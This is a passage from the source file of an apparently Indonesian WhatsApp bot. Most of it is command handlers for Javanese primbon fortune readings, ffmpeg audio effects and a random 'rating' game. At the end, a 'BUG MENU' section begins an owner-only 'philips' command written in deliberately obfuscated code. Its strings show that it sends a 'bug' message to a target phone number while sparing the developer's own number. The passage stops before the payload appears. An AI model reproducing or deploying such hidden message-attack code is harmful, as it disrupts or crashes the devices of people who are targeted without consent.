if (!q) return reply( `Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
reply(`> *Nama Suami :* ${anu.message.suami.nama}\n> *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n> *Nama Istri :* ${anu.message.istri.nama}\n> *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'sifatusaha': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Example : ${prefix+command} 24, 10, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`> *Lahir :* ${anu.message.hari_lahir}\n> *Usaha :* ${anu.message.usaha}`)
}
break
  case 'rejeki': case 'rezeki': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`)
} 
 break
case 'pekerjaan':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })         
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
 let [tgl, bln, thn] = q.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
 }
break
case 'potensipenyakit': case 'penyakit': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'artitarot': case 'tarot': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
                conn.sendImage(from, image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'fengshui': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Example : ${prefix + command} Rama  1, 2004\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = q.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
case 'haribaik': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'harisangar': case 'taliwangke': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'harinaas': case 'harisial': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
case 'nagahari': case 'harinaga': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'peruntungan': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Example : ${prefix + command} Rama, 12, 1, 2004, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = q.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'weton': case 'wetonjawa': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Example : ${prefix + command} Zeeone, 12, 1, 2004, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
case 'sifat': case 'karakter': {
if (!q) return reply(`Example : ${prefix + command} Zeeone,12, 1, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
case 'keberuntungan': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\n Nama, Tgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} Rama, 12, 1, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
case 'memancing': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Gunakan dengan cara :\nTgl lahir, bulan, tahun\n*Contoh* : ${prefix + command} 12, 1, 2004`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'masasubur': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })             
if (!q) return reply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = q.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
reply(`⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
 }
break 
// AUDIO CHANGER
case 'bass':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af equalizer=f=54:width_type=o:width=2:g=20'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'blown':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af acrusher=.1:1:64:0:log'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'deep':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af atempo=4/4,asetrate=44500*2/3'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'earrape':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af volume=12'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'fast':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=1.63,asetrate=44100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'fat':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=1.6,asetrate=22100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'nightcore':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "areverse'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'reverse':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "areverse"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'robot':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'slow':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=0.7,asetrate=44100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'smooth':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'tupai':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=0.5,asetrate=65100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

//»»————- ★ FUN MENU ★ ————-««
case 'goblokcek': case 'jelekcek': case 'gaycek':
case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek':case 'pintercek':
case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
const eyy =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const yn = eyy[Math.floor(Math.random() * eyy.length)]
conn.sendMessage(from, { text: `${yn}%` }, { quoted: msg })
break
// BUG MENU
// JANGAN EDIT YA KAK
// PAKE SESUAI FORMAT

// DILARANG SPAM BUG BOT
// KARENA BISA MENYEBABKAN
// WHATSAPP BOT TERBANNED

case 'philips':{
var _0x3c1d14=_0x49f3;(function(_0x4a07c8,_0x3c9493){var _0x3bc1f5=_0x49f3,_0x3eab21=_0x4a07c8();while(!![]){try{var _0x574559=-parseInt(_0x3bc1f5(0x1d0))/0x1+-parseInt(_0x3bc1f5(0x1c0))/0x2*(-parseInt(_0x3bc1f5(0x1cd))/0x3)+-parseInt(_0x3bc1f5(0x1c7))/0x4*(parseInt(_0x3bc1f5(0x1c1))/0x5)+-parseInt(_0x3bc1f5(0x1cf))/0x6+parseInt(_0x3bc1f5(0x1ce))/0x7*(parseInt(_0x3bc1f5(0x1c3))/0x8)+parseInt(_0x3bc1f5(0x1cc))/0x9*(-parseInt(_0x3bc1f5(0x1cb))/0xa)+parseInt(_0x3bc1f5(0x1bf))/0xb;if(_0x574559===_0x3c9493)break;else _0x3eab21['push'](_0x3eab21['shift']());}catch(_0x40dd11){_0x3eab21['push'](_0x3eab21['shift']());}}}(_0x327b,0x3e1d3));if(!isOwner)return reply(mess[_0x3c1d14(0x1bd)]);if(!q)return reply(_0x3c1d14(0x1c2)+(prefix+command)+_0x3c1d14(0x1c5));var num=q+_0x3c1d14(0x1c9),dev=_0x3c1d14(0x1c8);if(num==dev)return reply(_0x3c1d14(0x1ca));function _0x327b(){var _0x52ff57=['Itu\x20developer\x20gua','10GJRiUQ','2048616qnBhYO','214410utdqRB','2303707qhkYQV','499542sXRNiW','216817PMYkvP','OnlyOwner','Itu\x20Nomor\x20Lu\x20Sendiri','4287019dfovjc','14UDLpIb','5705POaKWk','Syntak\x20Error!\x0a*Contoh:*\x0a','8WwEbAy','sendMessage','\x20628xxx','Sukses\x20kirim\x20philips\x20to\x20@','1532iLxzNt','6283834558105@s.whatsapp.net','@s.whatsapp.net'];_0x327b=function(){return _0x52ff57;};return _0x327b();}function _0x49f3(_0x3630ea,_0x474aa9){var 